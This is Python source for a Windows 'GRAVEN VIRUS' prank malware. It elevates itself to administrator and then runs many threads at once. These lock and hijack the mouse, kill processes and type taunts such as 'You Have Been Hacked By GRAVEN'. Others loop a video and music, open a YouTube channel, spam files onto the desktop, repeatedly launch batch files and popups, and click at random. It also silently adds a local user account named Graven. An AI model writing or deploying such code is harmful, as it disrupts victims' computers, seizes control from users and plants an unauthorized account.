from pyautogui import position, size, moveTo, write, hotkey, click
from autoit import win_move
from selenium import webdriver
from sys import executable, argv
from ctypes import windll
from PIL import ImageTk, Image as Img
from os import system
from time import sleep
from threading import Thread
from getpass import getuser
from cv2 import WINDOW_FREERATIO, VideoCapture, namedWindow, resizeWindow, imshow, waitKey, destroyAllWindows
from keyboard import press_and_release
from random import uniform, randint
from simpleaudio import WaveObject
from curses import initscr, curs_set
from tkinter import *


if windll.shell32.IsUserAnAdmin():

    initscr()
    system("@ECHO OFF")

    screenWidth, screenHeight = size()
    cap = VideoCapture('assets/clip.mp4')
    music = WaveObject.from_wave_file("assets/music.wav")
    images = list()
    options = webdriver.ChromeOptions()
    options.add_argument("--disable-dev-shm-usage")
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-software-rasterizer")
    options.add_experimental_option("excludeSwitches", ["enable-logging"])
    steps_cooldown = {1: 5, 2: 20, 3: 30, 4: 36}

    # STEP 0

    def OpenVBS(): system("start assets/message.vbs")

    # STEP 1

    def LockMouse():
          sleep(steps_cooldown[1])
          for i in range(100): moveTo(-5000, 5000), sleep(0.1)


    def OpenNotepad(): sleep(steps_cooldown[1]), system("taskkill /f /im wscript.exe"), system("start /max notepad")


    def GravenWrite():
          sleep(steps_cooldown[1])
          sleep(0.5)
          system("taskkill /f /im cmd.exe")
          sleep(0.5)
          for i in range(40): press_and_release('ctrl+add')
          for word in "je suis la hehey\nGraven partout meme dans ton trou lolololol": write(word), sleep(uniform(0.001, 0.1))
          for i in range(20): hotkey("win", "up"), sleep(0.005), hotkey("win", "down"), sleep(0.005)
          system("taskkill /f /im notepad.exe")

    # STEP 2

    def Clip():
      sleep(steps_cooldown[2])
          
      while True:
        while (cap.isOpened()):

          ret, frame = cap.read()

          if ret == True:
            
            namedWindow("GRAVEN VIRUS", WINDOW_FREERATIO)
            resizeWindow("GRAVEN VIRUS", 960, 540)   
            imshow('GRAVEN VIRUS', frame)

            if waitKey(25) & 0xFF == ord('q'):
              0 + 0

          else: 
            break

        cap.release()
        destroyAllWindows()


    def PlaySound():
      sleep(steps_cooldown[2])
          
      while True:
        play_obj = music.play()
        play_obj.wait_done()


    def Selenium():
      sleep(steps_cooldown[2])
          
      driver = webdriver.Chrome(executable_path="chromedriver.exe", options=options)
      driver.get("https://www.youtube.com/user/Gravenilvectuto")


    def GravenCursor():
        
        global graven, canvas, cursor
          
        def CreateCursor():
                
            global cursor, graven, canvas

            cursor = Tk()
            cursor.geometry("25x25")
            cursor.overrideredirect(1)
            cursor.title("Graven Cursor")
            
            graven = ImageTk.PhotoImage(Img.open(f"assets/img.18.png"))
            canvas = Canvas(cursor, highlightthickness=0, bg="black")
            
            canvas.create_image(12.5, 12.5, image=graven)
            
            canvas.pack()
            
        sleep(steps_cooldown[2])

        CreateCursor()
                
        while True:
            
            try:
                curs_set(0)
                cursor.update()
                win_move("Graven Cursor", round(position()[0]-25/2), round(position()[1]-25/2))
                
            except: 
                CreateCursor()

    # STEP 3

    def OpenCmd():
      sleep(steps_cooldown[3])
      
      while True:
        system("start assets\\sys.bat")
        sleep(12.5)


    def CreateFolders():
      sleep(steps_cooldown[3])
      
      while True:
            with open(f"C:/Users/{getuser()}/Desktop/Graven is Here.virus", "w", encoding='utf-8') as v:
              v.write("Graven partout même dans ton trou")
            sleep(1.5)

    # STEP 4

    def StartPopups(): 
      sleep(steps_cooldown[4])
      system("start grv_popups.exe")
            
      
    def RandomClicks():
      sleep(steps_cooldown[4])

      while True:
        click((randint(0, screenHeight), randint(0, screenHeight)))
        sleep(0.1)


    def YouHaveBeenHackedByGraven():
      sleep(steps_cooldown[4])
      
      while True:
        write("You Have Been Hacked By GRAVEN,, ")
        sleep(2.5)


    threads = list()

    threads.append(Thread(target=Clip))
    threads.append(Thread(target=RandomClicks))
    threads.append(Thread(target=YouHaveBeenHackedByGraven))
    threads.append(Thread(target=StartPopups))
    threads.append(Thread(target=OpenCmd))
    threads.append(Thread(target=PlaySound))
    threads.append(Thread(target=CreateFolders))
    threads.append(Thread(target=Selenium))
    threads.append(Thread(target=LockMouse))
    threads.append(Thread(target=OpenNotepad))
    threads.append(Thread(target=GravenWrite))
    threads.append(Thread(target=OpenVBS))
    threads.append(Thread(target=GravenCursor))

    system(f"net user Graven /add")

    for thread in threads: thread.start()
    for thread in threads: thread.join()


else: windll.shell32.ShellExecuteW(None, "runas", executable, " ".join(argv[0:]), None, 1)
